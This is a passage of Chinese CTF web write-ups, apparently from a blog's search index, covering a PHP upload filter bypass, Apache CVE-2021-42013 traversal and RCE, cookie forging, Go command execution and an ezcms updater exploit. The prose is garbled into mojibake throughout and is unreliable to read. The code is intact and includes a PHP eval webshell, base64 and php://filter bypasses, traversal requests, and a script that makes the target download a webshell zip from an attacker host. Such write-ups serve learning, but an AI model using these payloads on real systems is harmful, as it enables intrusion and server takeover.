ä¸€ä¸ªæ–‡ä»¶è¯•è¯•\n\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220823191351613-1945987939.png\" width=200>\n\nç”±æ­¤å¯ä»¥å¾—çŸ¥è¯¥é¢˜ç›®åªèƒ½ä¸Šä¼ phpæ–‡ä»¶ã€‚ç›´æ¥è¯•è¯•`webshell.php`ä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œç»“æœä¸å‡ºæ„æ–™çš„å¤±è´¥äº†ï¼Œåˆè¯•äº†å‡ ä¸ªæœ¨é©¬çš„å˜å½¢ï¼Œå‘ç°éƒ½æ— æµäºäº‹ï¼Œåƒæ— å¤´è‹è‡ä¸€æ ·ä¹±æ’ã€‚åªä¼ å…¥`phpinfo()`çœ‹çœ‹æœ‰ä»€ä¹ˆæ”¶è·\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220823191704191-1792350946.png\" width=500>\nå‘ç°ä¸€å¤§å †`disable_functions`ï¼ŒåŸºæœ¬ä¸Šæ‰€æœ‰çš„æ¶æ„å‡½æ•°å…¨éƒ¨éƒ½è¢«è¿‡æ»¤ï¼Œæ¥ä¸‹æ¥è¯•è¯•ç”¨**æ‹¼æ¥ç»•è¿‡**çš„åŠæ³•è¯»å–`/etc/passwd`\n> Linux ç³»ç»Ÿä¸­çš„ /etc/passwd æ–‡ä»¶ï¼Œæ˜¯ç³»ç»Ÿç”¨æˆ·é…ç½®æ–‡ä»¶ï¼Œå­˜å‚¨äº†ç³»ç»Ÿä¸­æ‰€æœ‰ç”¨æˆ·çš„åŸºæœ¬ä¿¡æ¯ï¼Œå¹¶ä¸”æ‰€æœ‰ç”¨æˆ·éƒ½å¯ä»¥å¯¹æ­¤æ–‡ä»¶æ‰§è¡Œè¯»æ“ä½œã€‚\n\nè¿™é‡Œæˆ‘ä»¬ç”¨æœ€å¸¸ç”¨çš„`file_get_contents() å‡½æ•°`æ¥è¯»å–æ–‡ä»¶\n\n```\n<?php\necho (\"fil\".\"e_get_c\".\"ontents\")(\"/etc/passwd\");\n?>\n```\n\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220823211231635-994180552.png\" width=500>\n\næˆåŠŸè¯»å–ã€‚\né‚£ä¹ˆæ ¹æ®**WebæœåŠ¡å™¨çš„é»˜è®¤æ ¹æ–‡ä»¶å¤¹**`/var/www/html`ï¼Œå¯ä»¥å°è¯•è¯»å–ç½‘ç«™æºç ï¼ˆè¿™é‡Œå°è¯•`index.php`ï¼‰ï¼Œå°†æ–‡ä»¶ä»£ç æ”¹ä¸º\n\n```\n<?php\necho (\"fil\".\"e_get_c\".\"ontents\")(\"/var/www/html/index.php\");\n?>\n```\n\nä¸Šä¼ åæ‰“å¼€ï¼ŒæŸ¥çœ‹æºç \n\n```\n<?php\nfunction fun($var): bool{\n    $blacklist = [\"\\$_\", \"eval\",\"copy\" ,\"assert\",\"usort\",\"include\", \"require\", \"$\", \"^\", \"~\", \"-\", \"%\", \"*\",\"file\",\"fopen\",\"fwriter\",\"fput\",\"copy\",\"curl\",\"fread\",\"fget\",\"function_exists\",\"dl\",\"putenv\",\"system\",\"exec\",\"shell_exec\",\"passthru\",\"proc_open\",\"proc_close\", \"proc_get_status\",\"checkdnsrr\",\"getmxrr\",\"getservbyname\",\"getservbyport\", \"syslog\",\"popen\",\"show_source\",\"highlight_file\",\"`\",\"chmod\"];\n\n    foreach($blacklist as $blackword){\n        if(strstr($var, $blackword)) return True;\n    }\n\n    \n    return False;\n}\nerror_reporting(0);\n//è®¾ç½®ä¸Šä¼ ç›®å½•\ndefine(\"UPLOAD_PATH\", \"./uploads\");\n$msg = \"Upload Success!\";\nif (isset($_POST['submit'])) {\n$temp_file = $_FILES['upload_file']['tmp_name'];\n$file_name = $_FILES['upload_file']['name'];\n$ext = pathinfo($file_name,PATHINFO_EXTENSION);\nif(!preg_match(\"/php/i\", strtolower($ext))){\ndie(\"åªè¦å¥½çœ‹çš„php\");\n}\n\n$content = file_get_contents($temp_file);\nif(fun($content)){\n    die(\"è¯¶ï¼Œè¢«æˆ‘å‘ç°äº†å§\");\n}\n$new_file_name = md5($file_name).\".\".$ext;\n        $img_path = UPLOAD_PATH . '/' . $new_file_name;\n\n\n        if (move_uploaded_file($temp_file, $img_path)){\n            $is_upload = true;\n        } else {\n            $msg = 'Upload Failed!';\n            die();\n        }\n        echo '<div style=\"color:#F00\">'.$msg.\" Look here~ \".$img_path.\"</div>\";\n}\n```\n\nå‘ç°è¿‡æ»¤æ‰äº†`$_ã€evalã€assert`ç­‰å­—ç¬¦ä¸²ï¼Œä¹Ÿéš¾æ€ªæœ€åˆå°è¯•çš„åé—¨ä¸Šä¼ å¤±è´¥ã€‚äºæ˜¯å…ˆä¸Šä¼ äº†webshellçš„base64ç¼–ç phpæ–‡ä»¶â€”â€”`a.php`ã€‚\n\n```\n<?php @eval($_POST[1]); ?>//ä¸è¦å¿˜è®°åœ¨phpå…³é”®å­—ååŠ ç©ºæ ¼ï¼ï¼ï¼\nbase64ç¼–ç ç»•è¿‡â€”â€”>\nPD9waHAgQGV2YWwoJF9QT1NUWzFdKTsgPz4=\n```\n\nä½†`åå¼•å·`è¢«banï¼Œä¹Ÿä¸çŸ¥é“å¦‚ä½•æŠŠä»£ç è¯»å–å‡ºæ¥ç„¶åè§£ç ï¼Œä¹Ÿæ–­ç»äº†æˆ‘ç”¨base64è§£ç åå†æ‰§è¡Œçš„æƒ³æ³•ã€‚åœ¨å…¶ä»–å¤§ä½¬é‚£é‡Œå­¦åˆ°äº†[**PHPä¼ªåè®®**](https://blog.csdn.net/cosmoslin/article/details/120695429)ï¼Œäº†è§£åˆ°`php://filter`+`convert.base64-decodeè¿‡æ»¤å™¨`èƒ½è§£å†³é—®é¢˜ã€‚\n> php://filterå¯ä»¥è·å–æŒ‡å®šæ–‡ä»¶æºç ã€‚å½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œphp://filteræµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œ\n\n```\nphp://filter/convert.base64-decode/resource=39ab6b7b4e9946f4fef4d99ee6be3446.php//phpæ–‡ä»¶æ˜¯åˆšåˆšä¸Šä¼ çš„a.php\nbase64ç¼–ç ç»•è¿‡â€”â€”>\ncGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWRlY29kZS9yZXNvdXJjZT0zOWFiNmI3YjRlOTk0NmY0ZmVmNGQ5OWVlNmJlMzQ0Ni5waHA=\n```\n\nåªéœ€è¦ç”¨ä¸Šè¿°ä»£ç å°†ä¸Šä¼ çš„`a.php`ä»£ç è¯»å–å‡ºæ¥ç„¶åå†ç”¨åŒ…å«å‡½æ•°includeç»“åˆå³å¯ï¼Œå› æ­¤å†ä¸Šä¼ `b.php`ï¼ˆphpå‡½æ•°åä¸åŒºåˆ†å¤§å°å†™ï¼Œå¯åˆ©ç”¨æ­¤ç‚¹ç»•è¿‡ï¼‰\n\n```\n<?php Include(base64_decode(\"cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWRlY29kZS9yZXNvdXJjZT0zOWFiNmI3YjRlOTk0NmY0ZmVmNGQ5OWVlNmJlMzQ0Ni5waHA=\"));?>\n```\n\nä½†æ˜¯åšä¸»å°è¯•äº†ä¸€æ®µæ—¶é—´ç»“æœæ€ä¹ˆä¹Ÿä¼ ä¸ä¸Šå»ï¼Œäººéº»ä¸­éº»äº†å±äºæ˜¯ï¼Œç»“æœå‘ç°æ˜¯ä¸Šä¼ çš„æ–‡ä»¶åï¼ˆweb64.phpï¼‰ç»md5åŠ å¯†ç„¶åbase64ç¼–ç åå‡ºç°äº†`dl`ï¼Œè¢«è¿‡æ»¤äº†ã€‚æ¢äº†åå­—åæˆåŠŸä¸Šä¼ ã€‚\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220823231937120-1672813092.png\" width=500>\næ‰§è¡Œå‘½ä»¤æˆåŠŸï¼Œä½†æ˜¯èšå‰‘æ— æ³•è¿æ¥ï¼ˆå¤§æŠµæ˜¯å› ä¸ºæœ‰å¤ªå¤šå‡½æ•°è¢«banäº†ï¼‰ï¼Œåªèƒ½ç”¨å…¶ä»–åŠæ³•è§£å†³äº†ã€‚\n\nç½‘ä¸ŠæŸ¥é˜…å…¶ä»–å¸ˆå‚…çš„wpï¼Œå‘ç°è¦ç”¨åˆ°**LD_PRELOADåŠ«æŒ**ï¼ŒåæœŸå­¦ä¹ æ›´æ–°ã€‚\n\nèµ„æ–™ï¼š[æµ…è°ˆLD_PRELOADåŠ«æŒ](https://blog.csdn.net/qq_51295677/article/details/124338635)","tags":["CTF","web"],"categories":["wp-CTF","web"]},{"title":"2022DASCTF MAY å‡ºé¢˜äººæŒ‘æˆ˜èµ› web","url":"/2022/12/06/2022DASCTF-MAY-å‡ºé¢˜äººæŒ‘æˆ˜èµ›-web/","content":"\n\n# Power Cookie\n\n> æç¤ºï¼šåªæœ‰adminæ‰å¯ä»¥è·å–flag\n\nä¾æ®æç¤ºå¯ä»¥çŒœæµ‹ï¼Œæœ¬é¢˜å¯èƒ½éœ€è¦é€šè¿‡ä¿®æ”¹cookieå€¼æ¥è·å–flagã€‚\nä½¿ç”¨Burp SuiteæŠ“åŒ…æŸ¥çœ‹ResponseåŒ…\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817102430418-1960049030.png\" width=500>\nå‘ç°`admin=0`\näºæ˜¯åœ¨RequeståŒ…ä¸­åŠ å…¥`Cookie: admin=1`\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817102611588-243656756.png\" width=500>\n\næˆåŠŸå¾—åˆ°flagï¼\n***\n> æœ¬é¢˜åšé¢˜è¿‡ç¨‹åˆå§‹ï¼Œåšä¸»å°†`Cookie: admin=1`æ’åœ¨äº†è¯·æ±‚åŒ…çš„æœ«å°¾ï¼ˆå¦‚ä¸‹å›¾æ‰€ç¤ºï¼‰\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817102906051-436308076.png\" width=500>\nå¯¼è‡´å§‹ç»ˆæ— å“åº”ï¼ŒæŸ¥é˜…èµ„æ–™å‘ç°headeråŒ¹é…åˆ°`Upgrade`æ—¶å°†è¢«ç»ˆæ­¢ï¼Œè°ƒæ•´ä½ç½®åæˆåŠŸè§£å†³ï¼ŒåŸå› åº¶å‡ å¦‚æ­¤ï¼ˆ[è¯·æ±‚å¤´ headerä¸­ä¼ cookieä¸ç”Ÿæ•ˆåŸå› ](http://t.zoukankan.com/qinmengjiao123-123-p-13685262.html)ï¼‰\n\n***\n***\n\n# é­”æ³•æµè§ˆå™¨\nè¿›å…¥åå¾—åˆ°æç¤ºï¼š\n> æç¤ºï¼šflag.txt\nä¸ºä¿è¯æ–‡æ¡£å®‰å…¨ã€‚è¯·ä½¿ç”¨é­”æ³•æµè§ˆå™¨æ¥è®¿é—®ã€‚\n\nä¸æ˜æ‰€ä»¥ï¼ŒF12æŸ¥çœ‹\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817104826955-2116924557.png\" width=500>\nå¾—åˆ°è¿›ä¸€æ­¥æç¤ºï¼Œéœ€è¦`let ua = \"\\x4d\\x6f\\x7a\\x69\\x6c\\x6c\\x61\\x2f\\x35\\x2e\\x30 \\x28\\x57\\x69\\x6e\\x64\\x6f\\x77\\x73 \\x4e\\x54 \\x31\\x30\\x2e\\x30\\x3b \\x57\\x69\\x6e\\x36\\x34\\x3b \\x78\\x36\\x34\\x29 \\x41\\x70\\x70\\x6c\\x65\\x57\\x65\\x62\\x4b\\x69\\x74\\x2f\\x35\\x33\\x37\\x2e\\x33\\x36 \\x28\\x4b\\x48\\x54\\x4d\\x4c\\x2c \\x6c\\x69\\x6b\\x65 \\x47\\x65\\x63\\x6b\\x6f\\x29 \\x4d\\x61\\x67\\x69\\x63\\x2f\\x31\\x30\\x30\\x2e\\x30\\x2e\\x34\\x38\\x39\\x36\\x2e\\x37\\x35\"`\nç»“åˆâ€œä½¿ç”¨é­”æ³•æµè§ˆå™¨â€å¯ä»¥çŒœæƒ³åˆ°åº”è¯¥å°†è¯·æ±‚æŠ¥æ–‡ä¸­çš„User-Agentä¿®æ”¹ä¸ºå…¶è¦æ±‚çš„â€œMagicâ€å†…å®¹\n\n```\nMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Magic/100.0.4896.75\n```\n\nå‘é€ï¼ŒæˆåŠŸå¾—åˆ°flag\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817105507623-1654583652.png\" width=500>\n\n[çœ‹å…¶ä»–å¸ˆå‚…çš„wpæ—¶å‘ç°å¯ä»¥ç”¨consoleæ‰§è¡Œjsï¼Œè€Œä¸ç”¨å»utf-8è½¬ç ï¼Œåˆå­¦åˆ°äº†ä¸€ç‚¹]<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817110336451-169494747.png\" width=700>\n\n***\n***\n\n# getme\n\nF12æŸ¥çœ‹ï¼Œä¸€è„¸æ‡µé€¼\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817182444328-2077107608.png\" width=500>\né™¤äº†ä¸€è¡Œè·¯å¾„`pwd:/usr/local/apache2/`ï¼Œå¾—çŸ¥å…¶æ˜¯apacheï¼Œåˆ«æ— å…¶å®ƒä¿¡æ¯ã€‚\næŠ“åŒ…æŸ¥çœ‹è¿”å›åŒ…ï¼š\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817182848657-222743158.png\" width=\"200\">\nåªèƒ½è¯´â€œé»”é©´æŠ€ç©·â€ã€‚ä¹‹åæŸ¥æ‰¾å¸ˆå‚…ä»¬çš„wpå’Œç½‘ä¸Šçš„å„ç§èµ„æ–™ï¼Œå¾—çŸ¥**Apache/2.4.50 (Unix)**ç‰ˆæœ¬å­˜åœ¨ä»»æ„è·¯å¾„ç©¿è¶Šæ¼æ´ï¼ˆè¿™æ—¶å†å›æƒ³èµ·ä¸€å¼€å§‹çš„é‚£ä¸€è¡Œè·¯å¾„ï¼Œæˆ–è®¸ä¹Ÿæ˜¯åœ¨æç¤ºè¿™ä¸€ç‚¹ç½¢ï¼‰ã€‚\n[ [Apache è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆCVE-2021-42013ï¼‰](https://github.com/asaotomo/CVE-2021-42013-Apache-RCE-Poc-Exp)]\nç›´æ¥æ‰¾åˆ°CVEï¼Œç”¨pocå’Œexpå»æ‰“\n> //æŸ¥çœ‹ä»»æ„æ–‡ä»¶\n`GET /icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd HTTP/1.1`\n\n(è‹¥å°†`etc/passwd`æ”¹ä¸º`flag`ï¼Œåˆ™å¯è¯»å–åˆ°flagï¼Œä¸è¿‡æ˜¯å‡çš„ï¼Œæˆ‘ä»¬åé¢å†çœ‹)\n> //æ‰§è¡Œä»»æ„å‘½ä»¤\n`GET /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh HTTP/1.1`\n\næˆ‘ä»¬åˆ©ç”¨expå’ŒBurp Suiteå‘é€å‘½ä»¤\n`echo Content-Type: text/plain; echo;ls /\n//è¿™é‡Œçš„Content-Type: text/plain è§„å®šå°†æ–‡ä»¶è®¾ç½®ä¸ºçº¯æ–‡æœ¬çš„å½¢å¼`\n\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817184819761-451478684.png\" width=500>\n\nä»è€ŒæŸ¥çœ‹åˆ°æ‰€æœ‰çš„æ–‡ä»¶åï¼Œåœ¨å…¶ä¸­å‘ç°flagï¼Œè¯•å›¾`echo;cat /flag`è¯»å–\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817184950024-333636240.png\" width=500>\nç»“æœå‘ç°ä¸ºå‡ï¼Œåªèƒ½ä»å…¶ä»–çš„æ–‡ä»¶ä¸‹æ‰‹ï¼Œè¿™é‡Œå‡­è¿æ°”é€‰ä¸€ä¸ªæœ€å¥‡æ€ªçš„`diajgk`ï¼Œç„¶åä¸€å±‚å±‚æŸ¥çœ‹ï¼Œæœ€ç»ˆåœ¨ç¬¬å››å±‚å‘ç°ä¸€ä¸ªè²Œä¼¼flagçš„æ–‡ä»¶ï¼Œcatè¯»å–å¾—åˆ°flag\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817185335437-2104134847.png\" width=500>\n***\nè¿™ä¸€é¢˜æœ‰ä¸‰ä¸ªé—®é¢˜åœ¨è€—è´¹äº†å¤§é‡çš„æ—¶é—´ï¼Œéœ€è¦æ‰¾æ—¶é—´å†å»ç†è§£æ¸…æ™°ï¼š\n1ã€åœ¨æ‰¾flagçš„ç‚¹ä¸Šå­˜åœ¨ä¸€äº›é—®é¢˜ï¼Œå¦‚æœè¦ä¸€ä¸ªä¸ªå»æŠŠæ–‡ä»¶éƒ½è¯•ä¸€éæœªå…è¿‡äºç¦»è°±ã€‚åœ¨æ‰¾åŠæ³•çš„è¿‡ç¨‹ä¸­å‘ç°ä¸€ä½å¸ˆå‚…é€šè¿‡åˆ†ææŸ¥çœ‹æ—¥å¿—çš„åŠæ³•æ‰¾åˆ°æœ€ç»ˆçœŸæ­£çš„flagçš„è·¯å¾„ï¼Œä¸è¿‡å› ä¸ºä¸çŸ¥é“å…¶ä½¿ç”¨äº†æ€ä¹ˆæ ·çš„å‘½ä»¤è€Œæ— æ³•å¤ç°ï¼ˆç‚¹å‡»å›¾ç‰‡å¯è·³è½¬åˆ°è¿™ä½å¸ˆå‚…çš„åšå®¢ï¼‰\n[<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817185839323-780544381.png\" width=500>](https://blog.csdn.net/RABCDXB/article/details/124994738)\n2ã€å¦‚ä½•è¿ç”¨è¯¥expå»æ‰§è¡Œæ›´å¤šå…¶ä»–çš„å‘½ä»¤ï¼Œæœ‰ä½•è§„èŒƒï¼Ÿï¼ˆæˆ‘è‡ªå·±å°è¯•çš„cdã€tailç­‰å‡æ— æ•ˆï¼‰\n3ã€echoæœ‰ä»€ä¹ˆä½œç”¨ï¼Œä¸åˆ†å·è”åˆæ€æ ·ä½¿ç”¨ï¼Ÿ\n***\n***\n\n# hackme\n\nè¿™é¢˜ä¸å‡ºæ„å¤–çš„æ²¡æœ‰ä»€ä¹ˆæ€è·¯ï¼Œå‘ç°**GOTOLIST**æ˜¯å¯ä»¥ç‚¹å‡»çš„é“¾æ¥ï¼Œé‡Œé¢åˆæœ‰8ä¸ªé“¾æ¥ï¼Œä¸€ä¸ªä¸ªç‚¹è¿›å»ï¼Œæ²¡æœ‰å¤´ç»ªï¼Œå¥‡æ€ªçš„æ˜¯usersç‚¹è¿›å»å‡ºç°äº†è¿™æ ·ä¸€å¥ï¼š\n> Sorry there doesn't seem to be a users.go file\n\nåˆç»“åˆæœ€åä¸€ä¸ªé“¾æ¥â€”â€”ä¸Šä¼ ä¸€ä¸ª**.go**æ–‡ä»¶ï¼ŒçŒœæµ‹éœ€è¦ç”¨è¯¥é“¾æ¥ä¸Šä¼ ä¸€ä¸ªåå«**users.go**çš„goæ–‡ä»¶ï¼Œç„¶åç‚¹å‡»usersæ‰§è¡Œæ–‡ä»¶ã€‚ç„¶è€Œåšä¸»å¹¶ä¸çŸ¥é“ä»€ä¹ˆæ˜¯goæ–‡ä»¶ï¼Œä¹Ÿä¸çŸ¥é“æ€ä¹ˆç”¨ï¼Œç»§ç»­æ‡µé€¼ç€å»ç¿»å¤§ä½¬ä»¬çš„wpï¼Œå¾—çŸ¥å¯ä»¥æ‰¾åˆ°æ‰§è¡Œå‘½ä»¤çš„goè„šæœ¬ [os/exec æ‰§è¡Œå‘½ä»¤çš„äº”ç§å§¿åŠ¿](https://golang.iswbm.com/c05/c05_02.html)ï¼\n\né€‰æ‹©æ‰§è¡Œå‘½ä»¤å¹¶ä¸”èƒ½è·å–ç»“æœçš„åŠæ³•\n\n```\npackage main\n\nimport (\n\"fmt\"\n\"log\"\n\"os/exec\"\n)\n\nfunc main() {\n    cmd := exec.Command(\"ls\",\"/\")\n    out, err := cmd.CombinedOutput()\n    if err != nil {\n        fmt.Printf(\"combined out:\\n%s\\n\", string(out))\n        log.Fatalf(\"cmd.Run() failed with %s\\n\", err)\n    }\n    fmt.Printf(\"combined out:\\n%s\\n\", string(out))\n}\n```\n\nå‘ç°æˆåŠŸæ‰§è¡Œäº†`ls /`å‘½ä»¤\n![](https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817203359350-1628717592.png)\nä¸”æˆåŠŸæ‰¾åˆ°äº†è—èµ·æ¥çš„flagï¼Œå°†`cmd := exec.Command(\"ls\",\"/\")`æ›´æ”¹ä¸º`cmd := exec.Command(\"cat\",\"/flag\")`\n![æˆåŠŸè·å–flag](https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220817203655197-291459483.png)\næˆåŠŸè·å–flagï¼\n\n***\n***\n\n# ezcms\n\nä¸‹è½½æ–‡ä»¶åï¼Œå‘ç°æœ‰`admin.php`æ–‡ä»¶\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220818201224459-1716179419.png\" width=200>\n\nå¾—çŸ¥è¯¥ç½‘ç«™å­˜åœ¨åå°ï¼Œå¯¹æ–‡ä»¶å…¨å±€æœç´¢â€œå¯†ç â€ï¼Œç¢°å·§å‘ç°\n\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220818202107960-1160034001.png\" width=500>\n\nç”¨`admin 123456`æˆåŠŸç™»å…¥åå°ã€‚é€›äº†ä¸€åœˆï¼Œèƒ½ç‚¹çš„éƒ½ç‚¹äº†ä¸€éï¼Œæ²¡å‘ç°ä»€ä¹ˆå¯åˆ©ç”¨çš„ä¿¡æ¯ã€‚äºæ˜¯ä¸€ä¸ªä¸ªç¿»çœ‹æºç ï¼Œå¯æ˜¯åšä¸»ä¸å¤Ÿæ•é”ï¼Œæ²¡èƒ½å‘ç°å­˜åœ¨ç€`Update.php`å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œåæ¥æŸ¥çœ‹å…¶ä»–å¤§ä½¬çš„wpæ‰å›è¿‡ç¥æ¥ï¼šå—¯ï¼Œåœ¨adminæ–‡ä»¶å¤¹é‡Œï¼Œç¡®å®åº”è¯¥å†ä»”ç»†çœ‹ä¸€çœ‹ã€‚\n\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220818203053359-275459141.png\" width=600>\n\nè¿™æ®µä»£ç å‘Šè¯‰æˆ‘ä»¬ï¼Œåœ¨è¿™ä¸ªé¡µé¢ï¼Œå¯ä»¥ç”¨`GET`æ–¹å¼ä¼ `url`å€¼ï¼Œç„¶åè¯¥`url`ç»`sys_auth()`å‡½æ•°å¤„ç†åå°±ä¼šè¢«ä¸‹è½½ï¼Œåˆ¤æ–­`Content-Type`å€¼ä¸º`application/zip`å°±ä¼šè¢«è§£å‹ï¼Œç„¶åè¾“å‡º `ç‰ˆæœ¬å‡çº§æˆåŠŸ~`\n\näºæ˜¯è€ƒè™‘`sys_auth()`å‡½æ•°ä½œä½•ç”¨å¤„â€”â€”åŠ å¯†æˆ–è§£å¯†\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220818203716598-553405938.png\" width=500>\nä¸”å¯åˆ¤æ–­ï¼Œå½“`type=0`æ—¶åŠ å¯†ï¼Œä¼ å…¥`type=1`ä¸ºè§£å¯†ã€‚\né‚£ä¹ˆå°±æ€è·¯ä¾¿æ˜ç¡®äº†ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨vpsä¸Šéƒ¨ç½²ä¸€ä¸ªâ€œä¸€å¥è¯æœ¨é©¬â€çš„å‹ç¼©æ–‡ä»¶ï¼ˆ.zipï¼‰ï¼Œå¾—åˆ°`webshell.zip`çš„urlï¼Œç„¶åå°†è¯¥urlç”¨æºç ä¸­çš„`sys_auth()`åŠ å¯†ï¼Œæœ€åä»¥GETæ–¹å¼æŠŠåŠ å¯†åçš„urlä¸Šä¼ å³å¯ï¼Œå…·ä½“å®ç°å¦‚ä¸‹ï¼š\n\n```\n<?php\ndefine('Mc_Encryption_Key','GKwHuLj9AOhaxJ2');\n\n//å­—ç¬¦åŠ å¯†ã€è§£å¯† [0ä¸ºåŠ å¯†ï¼Œ1ä¸ºè§£å¯†]\nfunction sys_auth($string, $type = 0, $key = '', $expiry = 0) {\n\tif(is_array($string)) $string = json_encode($string);\n\tif($type == 1) $string = str_replace('-','+',$string);\n\t$ckey_length = 4;\n\t$key = md5($key ? $key : Mc_Encryption_Key);\n\t$keya = md5(substr($key, 0, 16));\n\t$keyb = md5(substr($key, 16, 16));\n\t$keyc = $ckey_length ? ($type == 1 ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';\n\t$cryptkey = $keya.md5($keya.$keyc);\n\t$key_length = strlen($cryptkey);\n\t$string = $type == 1 ? base64_decode(substr($string, $ckey_length)) :  sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;\n\t$string_length = strlen($string);\n\t$result = '';\n\t$box = range(0, 255);\n\t$rndkey = array();\n\tfor($i = 0; $i <= 255; $i++) {\n\t\t$rndkey[$i] = ord($cryptkey[$i % $key_length]);\n\t}\n\tfor($j = $i = 0; $i < 256; $i++) {\n\t\t$j = ($j + $box[$i] + $rndkey[$i]) % 256;\n\t\t$tmp = $box[$i];\n\t\t$box[$i] = $box[$j];\n\t\t$box[$j] = $tmp;\n\t}\n\tfor($a = $j = $i = 0; $i < $string_length; $i++) {\n\t\t$a = ($a + 1) % 256;\n\t\t$j = ($j + $box[$a]) % 256;\n\t\t$tmp = $box[$a];\n\t\t$box[$a] = $box[$j];\n\t\t$box[$j] = $tmp;\n\t\t$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));\n\t} \n\tif($type == 1) {\n\t\tif((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {\n\t\t\t$result = substr($result, 26);\n\t\t\t$json = json_decode($result,1);\n\t\t\tif(!is_numeric($result) && $json){\n\t\t\t\treturn $json;\n\t\t\t}else{\n\t\t\t\treturn $result;\n\t\t\t}\n\t\t}\n\t\treturn '';\n\t}\n\treturn str_replace('+', '-', $keyc.str_replace('=', '', base64_encode($result)));\n}\n//ä»¥ä¸‹ä¸ºåˆ©ç”¨æºç å‡½æ•°è¿›è¡ŒsysåŠ å¯†\n$ans=sys_auth(\"http://ip.ip.ip.ip/acmd.zip\");//æˆ‘ä¸Šä¼ çš„webshellå‹ç¼©æ–‡ä»¶åä¸ºacmd.zip\nvar_dump($ans);\n\n?>\n```\n\nåˆ©ç”¨å¦‚ä¸Šexpå¾—åˆ°åŠ å¯†çš„urlï¼š\n> äº‹å®ä¸Šåšä¸»ç¬¬ä¸€æ¬¡å¤±è´¥äº†ï¼Œå‘ç°åŸæ¥ä»£ç é‡Œè¿˜å­˜åœ¨ç€ä¸€ä¸ªå…¨å±€å˜é‡![](https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220818204653057-598288141.png)\nè·Ÿè¸ªæŸ¥æ‰¾å³å¯ä»¥æ‰¾åˆ°`define('Mc_Encryption_Key','GKwHuLj9AOhaxJ2');`\nåŠ ä¸Šè¿™å¥å®šä¹‰åæˆåŠŸ\n\n`string(79) \"498bUpfpc2DVbWQdqxFIo8gRcC76FVJksWQcRwY5OCDSBXHMEF3zd07OYVMsJekRsip5UY2acffwS1Q\"`\næ‹¿åˆ°åŠ å¯†urlåç›´æ¥ä¸Šä¼ ï¼š\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220818205303419-51425222.png\" width=500>\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220818205518891-1217499246.png\" width=500>\n\næˆåŠŸï¼æ¥ä¸‹æ¥ï¼Œæˆ‘ä¾¿å¼€å§‹è¯•å›¾åœ¨`update.php`æºç ä¸­æ‰¾åˆ°æ–‡ä»¶ä¸‹è½½æˆ–è§£å‹åæ‰€åœ¨çš„ä½ç½®ï¼Œæ­¤é—´è·Ÿè¸ªäº†å‡ ä¸ªç±»ã€å‡½æ•°å¦‚`mczip->PclZip()`ç»“æœå¹¶æ²¡æœ‰åˆ†æå‡ºä»€ä¹ˆæ¥ï¼Œåªå¾—å†å»ç¿»çœ‹å…¶ä»–å¸ˆå‚…çš„wpï¼Œå‘ç°ä»–ä»¬çš„åé—¨å°±åœ¨æ ¹ç›®å½•ä¸‹ï¼Œäºæ˜¯èšå‰‘ğŸ—¡è¿æ¥ï¼Œflagè¿˜æ˜¯åœ¨æ ¹ç›®å½•ä¸‹:\n\n<img src=\"https://img2022.cnblogs.com/blog/2933309/202208/2933309-20220818210721537-1371645933.png\" width=500>\n\næ‰“å¼€åæˆåŠŸå¾—åˆ°flag`DASCTF{86527acc-676d-4267-a1a1-b46337a3a2a6}`\n***\nè¿™é¢˜äºæˆ‘è€Œè¨€å¾ˆæ‰¯æ·¡çš„ç‚¹å°±æ˜¯vpséƒ¨ç½²å’Œè§£å‹ç›®å½•æŸ¥æ‰¾ï¼Œä¸€å¼€å§‹æˆ‘è„‘å­æœ‰ç‚¹è¿›æ·¼ç«Ÿç„¶ç”¨æœ¬åœ°çš„PHP studyæ­å»ºçš„ç½‘ç«™ä¸Šä¼ 